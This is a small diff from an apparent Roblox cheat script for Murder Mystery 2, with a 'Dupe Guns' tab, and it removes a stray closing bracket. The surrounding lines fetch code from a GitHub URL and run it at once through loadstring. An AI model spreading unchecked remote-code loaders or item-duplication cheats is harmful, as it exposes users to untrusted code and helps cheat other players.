@@ -11,7 +11,6 @@ OrionLib:MakeNotification({
 
 getgenv().gui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/Orion-librarysource"))()
-})
 local Window = OrionLib:MakeWindow({Name = "HiddenScriptsHub🎩-Mm2 [3.0]-Summer Update🏄", HidePremium = false, IntroText = "HiddenScriptsHub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
 local Tab = Window:MakeTab({
     Name = "Dupe Guns 🔫",
